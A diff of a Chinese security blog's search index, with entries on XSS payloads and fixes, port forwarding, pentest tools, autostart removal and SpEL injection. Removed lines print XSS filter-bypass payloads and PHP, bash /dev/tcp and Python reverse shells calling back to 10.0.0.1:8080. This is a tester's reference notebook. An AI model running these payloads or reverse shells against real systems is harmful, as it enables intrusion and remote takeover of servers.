-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#常见反射型</span><br><span class="line">	&quot;+onmouseover=alert/*abcd*/`xss`</span><br><span class="line">	</span><br><span class="line">	&quot;&quot;; alert`<span class="number">1</span>`; //&quot;;</span><br><span class="line">	<span class="number">0</span>||alert<span class="variable">%0D`1`//</span></span><br><span class="line"><span class="variable">	%</span><span class="number">0</span>a`$&#123;alert%<span class="number">0</span>D(<span class="number">1</span>)&#125;`</span><br><span class="line">	onload=alert`<span class="number">1</span>` //</span><br><span class="line"></span><br><span class="line">#流程中含有转义步骤</span><br><span class="line">	\u0022\u003b+alert\u00601\u0060\u003b+//</span><br></pre></td></tr></table></figure>
-
-<p>注：html解析<strong>HTML 实体编码</strong></p>
-<p>​	例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;quot;   html解码成	&quot;</span><br></pre></td></tr></table></figure>
-
-<p>注：<strong>JavaScript Unicode 转义（\uXXXX）</strong> 和 <strong>URL 编码（%XX）</strong></p>
-<p>xxs需要注意被墙了可以尝试从转义或者解析角度注入</p>
-<p>当然文件预览的方向也可以尝试</p>
-<p>可以通过<a href="https://hackerone.com/hacktivity/cwe_discovery?id=CWE-79">网址</a>来查看以前大佬们提交的漏洞</p>
-<h3 id="若响应包存在请求头-application-javascript"><a href="#若响应包存在请求头-application-javascript" class="headerlink" title="若响应包存在请求头     application&#x2F;javascript"></a>若响应包存在请求头     application&#x2F;javascript</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">通杀测试</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;http://xxxxx/xss/xss.gif&#x27;</span> <span class="attr">alt</span>=<span class="string">&#x27;Smiley face&#x27;</span> <span class="attr">width</span>=<span class="string">&#x27;32&#x27;</span> <span class="attr">height</span>=<span class="string">&#x27;32&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>python  jsingif.py  -i  hack.gif  “javascript:alert(‘Power_Liu’)”</p>
-<p><a href="https://github.com/stayliv3/blog_material/blob/master/csp/jsingif.py">jsingif.py</a></p>
-<p>用ai改了一下，python3也可以用</p>
-<p><a href="../tool/xss/jsingif.py">jsingif.py</a></p>
-<h3 id="若页面存在预览和上传"><a href="#若页面存在预览和上传" class="headerlink" title="若页面存在预览和上传"></a>若页面存在预览和上传</h3><p>则<a href="https://github.com/cliayn/cliayn.github.io/blob/master/tool/xss/xss.pdf">xss.pdf</a></p>
-<h3 id="经典示例："><a href="#经典示例：" class="headerlink" title="经典示例："></a>经典示例：</h3><h5 id="get参数变更"><a href="#get参数变更" class="headerlink" title="get参数变更"></a>get参数变更</h5><p>示例poc：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.xxx.com/employers/sem-dual-lp/?utm_source=abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e</span><br></pre></td></tr></table></figure>
-
-<p>payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e</span><br><span class="line">	解析：</span><br><span class="line"></span><br><span class="line">abc&#x27;%3breturn+false&#125;)%3b&#125;)%3balert`xss ;&lt;%2fscript&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="图片名称变更"><a href="#图片名称变更" class="headerlink" title="图片名称变更"></a>图片名称变更</h5><p>payload:       \ “&gt;&lt;img src&#x3D;1 onerror&#x3D;&quot; URL&#x3D;String;</p>
-<p><img src="/../image/xss/expected_request.png"></p>
-<h2 id="xss修复建议"><a href="#xss修复建议" class="headerlink" title="xss修复建议"></a>xss修复建议</h2><p>✅和⚠️表示仍可以优化</p>
-<h3 id="①-编码与解析行为"><a href="#①-编码与解析行为" class="headerlink" title="① 编码与解析行为"></a>① 编码与解析行为</h3><ul>
-<li>✅ <strong>HTML 实体会被换元（<code>&amp;#60;</code> → <code>&lt;</code>）</strong></li>
-<li>❌ <strong>URL 编码不会被解析（<code>%3C</code> 不会还原）</strong></li>
-<li>❌ <strong>实体不会再被二次解析</strong></li>
-<li>⚠️ <strong>只有在“属性上下文”里才会被解析一次</strong></li>
-</ul>
-<p>👉 这么改的用途：</p>
-<blockquote>
-<p><strong>不存在通用 DOM 二次解析链</strong></p>
-</blockquote>
-<hr>
-<h3 id="②-属性白名单（非常严格）"><a href="#②-属性白名单（非常严格）" class="headerlink" title="② 属性白名单（非常严格）"></a>② 属性白名单（非常严格）</h3><ul>
-<li>❌ 除 <code>href</code> &#x2F; <code>src</code> 外，其余属性全部被过滤</li>
-<li>❌ 所有 <code>on*</code> 事件被灭</li>
-<li>❌ style &#x2F; data-* &#x2F; 自定义属性被灭</li>
-</ul>
-<p>👉 这是 <strong>属性级白名单 sanitizer</strong></p>
-<hr>
-<h3 id="③-协议与资源策略"><a href="#③-协议与资源策略" class="headerlink" title="③ 协议与资源策略"></a>③ 协议与资源策略</h3><ul>
-<li>❌ <code>javascript:</code> ❌</li>
-<li>❌ <code>data:</code> ❌</li>
-<li>❌ URL 解码后再判断（说明是 parse 后校验）</li>
-<li>⚠️ 自动链接存在（URL → <code>&lt;a&gt;</code>）</li>
-<li>❌ 白名单标签</li>
-</ul>
-<hr>
-<h3 id="④-Flash-的处理方式"><a href="#④-Flash-的处理方式" class="headerlink" title="④ Flash 的处理方式"></a>④ Flash 的处理方式</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;movie.swf&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">allowscriptaccess</span>=<span class="string">&quot;never&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">allownetworking</span>=<span class="string">&quot;internal&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">type</span>=<span class="string">&quot;application/x-shockwave-flash&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>❌<code>allowscriptaccess=&quot;never&quot;</code> → <strong>Flash 无法调用 JS</strong></li>
-<li>❌<code>allownetworking=&quot;internal&quot;</code> → <strong>不能外联</strong></li>
-<li>❌MIME 明确限制</li>
-</ul>
-<p>👉 这不是“被动过滤”，而是<strong>主动重写为安全配置</strong></p>
-<h3 id="⑤-域名白名单-CSP"><a href="#⑤-域名白名单-CSP" class="headerlink" title="⑤ 域名白名单 &#x2F; CSP"></a>⑤ 域名白名单 &#x2F; CSP</h3><ul>
-<li>❌只加载的官方脚本</li>
-</ul>
-<p>👉 防止加载外部js导致xss</p>
-<h1 id="PHP-Reverse-Shell"><a href="#PHP-Reverse-Shell" class="headerlink" title="PHP Reverse Shell"></a>PHP Reverse Shell</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sock</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;10.0.0.1&quot;</span>,<span class="number">8080</span>);</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#centos--反弹shell</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>/<span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#python</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#x27;</span></span><br></pre></td></tr></table></figure>
-
-
-]]></content>
-      <categories>
-        <category>Cybersecurity</category>
-      </categories>
-      <tags>
-        <tag>payload</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>主页和api</title>
     <url>/2024/12/26/%E4%B8%BB%E9%A1%B5%E5%92%8Capi/</url>
     <content><![CDATA[<h1 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h1><p>在工作期间所遇到的小程序和web端所用的方式如下：</p>
@@ -1748,31 +1788,6 @@
       <tags>
         <tag>api</tag>
         <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>代理记录</title>
-    <url>/2025/08/27/%E4%BB%A3%E7%90%86%E8%AF%A6%E8%A7%A3/</url>
-    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p>​	今天琢磨端口映射的时候懒得输入内网地址，想直接用回显地址找到端口服务的时候硬是找不到</p>
-<h6 id="1-回显地址默认不经代理的解决办法"><a href="#1-回显地址默认不经代理的解决办法" class="headerlink" title="1&gt;回显地址默认不经代理的解决办法"></a>1&gt;回显地址默认不经代理的解决办法</h6><p><a href="https://stackoverflow.com/questions/57419408/how-to-make-firefox-use-a-proxy-server-for-localhost-connections#:~:text=You%20have%20to%20change%20another,in%20about%3Aconfig">stackoverflow网址中的解决办法</a></p>
-<p>简单来说就是进入浏览器的高级配置的首选项进行更改，主要原因在于浏览器的配置默认回显地址不经过代理，如下以火狐浏览器为例：</p>
-<p><img src="/../image/proxy-/1.png"></p>
-<span id="more"></span>
-
-<h1 id="1-局域网映射端口"><a href="#1-局域网映射端口" class="headerlink" title="1-局域网映射端口"></a>1-局域网映射端口</h1><h6 id="1-内网穿透-局域网端口映射"><a href="#1-内网穿透-局域网端口映射" class="headerlink" title="1&gt;内网穿透-&gt;局域网端口映射"></a>1&gt;内网穿透-&gt;局域网端口映射</h6><p>假设我连接了内网的wifi，然后访问它的web服务192.168.123.1:8080，现在我电脑开热点给其他人，让其他人访问内网的web服务，我怎么将192.168.123.1映射到我的热点（热点为nat模式）</p>
-<p>#<strong>解决方案</strong></p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">##windows</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">8080</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">8080</span></span><br><span class="line">---</span><br><span class="line">#如果更多的端口映射</span><br><span class="line"><span class="comment">rem 映射Web服务 (HTTP)</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">80</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">80</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射HTTPS服务</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">443</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">443</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射远程桌面 (RDP)</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">3389</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">3389</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射SSH服务</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">22</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">22</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射你之前设置的8080端口</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">8080</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">8080</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射SMB文件共享</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">445</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">445</span></span><br><span class="line"></span><br><span class="line">##linux</span><br><span class="line">#启用IP转发（临时）</span><br><span class="line">sudo sysctl -w <span class="built_in">net</span>.ipv4.ip_forward=<span class="number">1</span></span><br><span class="line">#永久</span><br><span class="line">sudo nano /etc/sysctl.conf</span><br><span class="line">#更新</span><br><span class="line">sudo sysctl -p</span><br><span class="line"># 将目标为热点IP:<span class="number">8080</span>的包，转发到内网服务器</span><br><span class="line">sudo iptables -t nat -A PREROUTING -p tcp -i wlan1 --dport <span class="number">8080</span> -j DNAT --to-destination <span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span>:<span class="number">8080</span></span><br></pre></td></tr></table></figure>
-
-<p>当然直接用<strong>Ngrok &#x2F; FRP (Fast Reverse Proxy) &#x2F; ew</strong>等穿透工具都可以</p>
-<p>无互联网开热点的解决方案如下：</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">##windows</span><br><span class="line">netsh wlan <span class="built_in">set</span> hostednetwork <span class="built_in">mode</span>=allow ssid=MyHotspot key=MyPassword123</span><br><span class="line">#开启</span><br><span class="line">netsh wlan <span class="built_in">start</span> hostednetwork</span><br><span class="line">#关闭</span><br><span class="line">netsh wlan stop hostednetwork</span><br><span class="line">#查看</span><br><span class="line">netsh wlan show hostednetwork</span><br><span class="line">#删除</span><br><span class="line">netsh wlan <span class="built_in">set</span> hostednetwork <span class="built_in">mode</span>=disallow</span><br><span class="line">#检查是否可以</span><br><span class="line">netsh wlan show drivers</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Cybersecurity</category>
-      </categories>
-      <tags>
-        <tag>article</tag>
       </tags>
   </entry>
   <entry>
@@ -1808,27 +1823,6 @@
       </tags>
   </entry>
   <entry>
-    <title>做测试要准备的工具</title>
-    <url>/2025/10/10/%E5%81%9A%E6%B5%8B%E8%AF%95%E8%A6%81%E5%87%86%E5%A4%87%E7%9A%84%E5%B7%A5%E5%85%B7/</url>
-    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p>因为内网环境老是需要准备工具，记录一份简易的工具列表</p>
-<span id="more"></span>
-
-<h1 id="1-工具"><a href="#1-工具" class="headerlink" title="1-工具"></a>1-工具</h1><p>抓包工具（简单配置）</p>
-<p>bp（yakit、mitm）</p>
-<p>插件-</p>
-<p>JsRouteScan、HaE（config.yml）、RouteVulScan（config.yaml）、fastjson、fakeip、xiazhu</p>
-<p>目录、正则、遍历、框架、ip</p>
-<p>python环境(包含依赖)：</p>
-<p>.zip&#x2F;.dir&#x3D;&#x3D;&gt;dirsearch.py(更新目录)&lt;&#x3D;&#x3D;spring-boot</p>
-]]></content>
-      <categories>
-        <category>move-tool</category>
-      </categories>
-      <tags>
-        <tag>Test</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>关于ai助手的测试</title>
     <url>/2026/02/04/%E5%85%B3%E4%BA%8Eai%E5%8A%A9%E6%89%8B%E7%9A%84%E6%B5%8B%E8%AF%95/</url>
     <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p><code>把ai当成用户进行测试</code></p>
@@ -1854,6 +1848,52 @@
       </categories>
       <tags>
         <tag>article</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>代理记录</title>
+    <url>/2025/08/27/%E4%BB%A3%E7%90%86%E8%AF%A6%E8%A7%A3/</url>
+    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p>​	今天琢磨端口映射的时候懒得输入内网地址，想直接用回显地址找到端口服务的时候硬是找不到</p>
+<h6 id="1-回显地址默认不经代理的解决办法"><a href="#1-回显地址默认不经代理的解决办法" class="headerlink" title="1&gt;回显地址默认不经代理的解决办法"></a>1&gt;回显地址默认不经代理的解决办法</h6><p><a href="https://stackoverflow.com/questions/57419408/how-to-make-firefox-use-a-proxy-server-for-localhost-connections#:~:text=You%20have%20to%20change%20another,in%20about%3Aconfig">stackoverflow网址中的解决办法</a></p>
+<p>简单来说就是进入浏览器的高级配置的首选项进行更改，主要原因在于浏览器的配置默认回显地址不经过代理，如下以火狐浏览器为例：</p>
+<p><img src="/../image/proxy-/1.png"></p>
+<span id="more"></span>
+
+<h1 id="1-局域网映射端口"><a href="#1-局域网映射端口" class="headerlink" title="1-局域网映射端口"></a>1-局域网映射端口</h1><h6 id="1-内网穿透-局域网端口映射"><a href="#1-内网穿透-局域网端口映射" class="headerlink" title="1&gt;内网穿透-&gt;局域网端口映射"></a>1&gt;内网穿透-&gt;局域网端口映射</h6><p>假设我连接了内网的wifi，然后访问它的web服务192.168.123.1:8080，现在我电脑开热点给其他人，让其他人访问内网的web服务，我怎么将192.168.123.1映射到我的热点（热点为nat模式）</p>
+<p>#<strong>解决方案</strong></p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">##windows</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">8080</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">8080</span></span><br><span class="line">---</span><br><span class="line">#如果更多的端口映射</span><br><span class="line"><span class="comment">rem 映射Web服务 (HTTP)</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">80</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">80</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射HTTPS服务</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">443</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">443</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射远程桌面 (RDP)</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">3389</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">3389</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射SSH服务</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">22</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">22</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射你之前设置的8080端口</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">8080</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">8080</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射SMB文件共享</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">445</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">445</span></span><br><span class="line"></span><br><span class="line">##linux</span><br><span class="line">#启用IP转发（临时）</span><br><span class="line">sudo sysctl -w <span class="built_in">net</span>.ipv4.ip_forward=<span class="number">1</span></span><br><span class="line">#永久</span><br><span class="line">sudo nano /etc/sysctl.conf</span><br><span class="line">#更新</span><br><span class="line">sudo sysctl -p</span><br><span class="line"># 将目标为热点IP:<span class="number">8080</span>的包，转发到内网服务器</span><br><span class="line">sudo iptables -t nat -A PREROUTING -p tcp -i wlan1 --dport <span class="number">8080</span> -j DNAT --to-destination <span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span>:<span class="number">8080</span></span><br></pre></td></tr></table></figure>
+
+<p>当然直接用<strong>Ngrok &#x2F; FRP (Fast Reverse Proxy) &#x2F; ew</strong>等穿透工具都可以</p>
+<p>无互联网开热点的解决方案如下：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">##windows</span><br><span class="line">netsh wlan <span class="built_in">set</span> hostednetwork <span class="built_in">mode</span>=allow ssid=MyHotspot key=MyPassword123</span><br><span class="line">#开启</span><br><span class="line">netsh wlan <span class="built_in">start</span> hostednetwork</span><br><span class="line">#关闭</span><br><span class="line">netsh wlan stop hostednetwork</span><br><span class="line">#查看</span><br><span class="line">netsh wlan show hostednetwork</span><br><span class="line">#删除</span><br><span class="line">netsh wlan <span class="built_in">set</span> hostednetwork <span class="built_in">mode</span>=disallow</span><br><span class="line">#检查是否可以</span><br><span class="line">netsh wlan show drivers</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Cybersecurity</category>
+      </categories>
+      <tags>
+        <tag>article</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>做测试要准备的工具</title>
+    <url>/2025/10/10/%E5%81%9A%E6%B5%8B%E8%AF%95%E8%A6%81%E5%87%86%E5%A4%87%E7%9A%84%E5%B7%A5%E5%85%B7/</url>
+    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p>因为内网环境老是需要准备工具，记录一份简易的工具列表</p>
+<span id="more"></span>
+
+<h1 id="1-工具"><a href="#1-工具" class="headerlink" title="1-工具"></a>1-工具</h1><p>抓包工具（简单配置）</p>
+<p>bp（yakit、mitm）</p>
+<p>插件-</p>
+<p>JsRouteScan、HaE（config.yml）、RouteVulScan（config.yaml）、fastjson、fakeip、xiazhu</p>
+<p>目录、正则、遍历、框架、ip</p>
+<p>python环境(包含依赖)：</p>
+<p>.zip&#x2F;.dir&#x3D;&#x3D;&gt;dirsearch.py(更新目录)&lt;&#x3D;&#x3D;spring-boot</p>
+]]></content>
+      <categories>
+        <category>move-tool</category>
+      </categories>
+      <tags>
+        <tag>Test</tag>
       </tags>
   </entry>
   <entry>
@@ -2515,6 +2555,36 @@
       </tags>
   </entry>
   <entry>
+    <title>常见进程自启处理</title>
+    <url>/2026/01/29/%E5%B8%B8%E8%A7%81%E8%BF%9B%E7%A8%8B%E8%87%AA%E5%90%AF/</url>
+    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h1><p>电脑弹出了两个广告，我一看小窗口，没有运行的第三方程序，我根据进程找了一下，发现一个是雷电模拟器的广告，一个是wps的广告，主要是wps的进程明明是手动启动的，但它还是每次自启了，顺便把云服务也带起来自启了，以下记录了完全关闭自启的几种方法，以后换电脑也能记得调。[自动更新服务可以留着，防止对应软件存在漏洞未及时更新]</p>
+<span id="more"></span>
+
+<h1 id="1-任务计划程序"><a href="#1-任务计划程序" class="headerlink" title="1.任务计划程序"></a>1.任务计划程序</h1><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#<span class="built_in">cmd</span></span><br><span class="line">taskschd.msc</span><br></pre></td></tr></table></figure>
+
+<p><code>wps</code>它就有几个定时任务，简直难它天，我就说老关不掉</p>
+<p><img src="/../image/taskschd/wps%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%88%AA%E5%9B%BE.png"></p>
+<h1 id="2-服务"><a href="#2-服务" class="headerlink" title="2.服务"></a>2.服务</h1><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#<span class="built_in">cmd</span></span><br><span class="line">services.msc</span><br></pre></td></tr></table></figure>
+
+<p>像雷电模拟器以及云服务启动之类的可能会在这里</p>
+<p><img src="/../image/taskschd/wps%E4%BA%91%E6%9C%8D%E5%8A%A1.png"></p>
+<h1 id="3-注册表（通用）"><a href="#3-注册表（通用）" class="headerlink" title="3.注册表（通用）"></a>3.注册表（通用）</h1><p>推荐工具<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns">Autoruns</a></p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#<span class="built_in">cmd</span></span><br><span class="line">regedit</span><br></pre></td></tr></table></figure>
+
+<p>上面两个方法一个关闭服务，一个关闭计划任务差不多可以了，但有些是dll这些进程在注册表里，只能采用注册表删除，建议用微软自己的工具<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns">Autoruns</a>来disable，防止删除了其他系统数据</p>
+<p><img src="/../image/taskschd/%E9%9B%B7%E7%94%B5%E6%A8%A1%E6%8B%9F%E5%99%A8%E8%87%AA%E5%90%AF.png"></p>
+<p><code>TSVNCache.exe</code>等，常见<strong>注册表启动项</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Cybersecurity</category>
+      </categories>
+      <tags>
+        <tag>article</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>指南针-导航</title>
     <url>/2025/04/01/%E5%AF%BC%E8%88%AA/</url>
     <content><![CDATA[<h1 id="项目"><a href="#项目" class="headerlink" title="项目"></a>项目</h1><p>主要：<a href="https://github.com/Kr0oked/Compass">指南针项目</a></p>
@@ -2548,57 +2618,6 @@
       </tags>
   </entry>
   <entry>
-    <title>常见表达式分析</title>
-    <url>/2026/02/04/%E5%B8%B8%E8%A7%81%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p><code>常见表达式</code></p>
-<p><strong>动态逻辑类：表达式语言 (Expression Language, EL)：</strong></p>
-<p><code>SpEL (Spring Expression Language)、OGNL (Object-Graph Navigation Language)、QL (Quick Language)</code></p>
-<p> <strong>数据库逻辑类：SQL 表达式</strong></p>
-<p><strong>文本处理类：正则表达式</strong></p>
-<p><strong>定时任务类：Cron 表达式</strong></p>
-<p><strong>数据导航类：路径表达式</strong></p>
-<span id="more"></span>
-
-<h1 id="1-表达式语言"><a href="#1-表达式语言" class="headerlink" title="1-表达式语言"></a>1-表达式语言</h1><p>蓝凌 <code>OA</code> 等 <code>Java</code> 系产品的很多漏洞都源于 **<code>SpEL 注入</code>**，攻击者可以通过特定的表达式直接执行 <code>java.lang.Runtime.getRuntime().exec()</code> 来拿下服务器权限</p>
-]]></content>
-      <categories>
-        <category>Cybersecurity</category>
-      </categories>
-      <tags>
-        <tag>Backend</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>常见进程自启处理</title>
-    <url>/2026/01/29/%E5%B8%B8%E8%A7%81%E8%BF%9B%E7%A8%8B%E8%87%AA%E5%90%AF/</url>
-    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h1><p>电脑弹出了两个广告，我一看小窗口，没有运行的第三方程序，我根据进程找了一下，发现一个是雷电模拟器的广告，一个是wps的广告，主要是wps的进程明明是手动启动的，但它还是每次自启了，顺便把云服务也带起来自启了，以下记录了完全关闭自启的几种方法，以后换电脑也能记得调。[自动更新服务可以留着，防止对应软件存在漏洞未及时更新]</p>
-<span id="more"></span>
-
-<h1 id="1-任务计划程序"><a href="#1-任务计划程序" class="headerlink" title="1.任务计划程序"></a>1.任务计划程序</h1><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#<span class="built_in">cmd</span></span><br><span class="line">taskschd.msc</span><br></pre></td></tr></table></figure>
-
-<p><code>wps</code>它就有几个定时任务，简直难它天，我就说老关不掉</p>
-<p><img src="/../image/taskschd/wps%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%88%AA%E5%9B%BE.png"></p>
-<h1 id="2-服务"><a href="#2-服务" class="headerlink" title="2.服务"></a>2.服务</h1><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#<span class="built_in">cmd</span></span><br><span class="line">services.msc</span><br></pre></td></tr></table></figure>
-
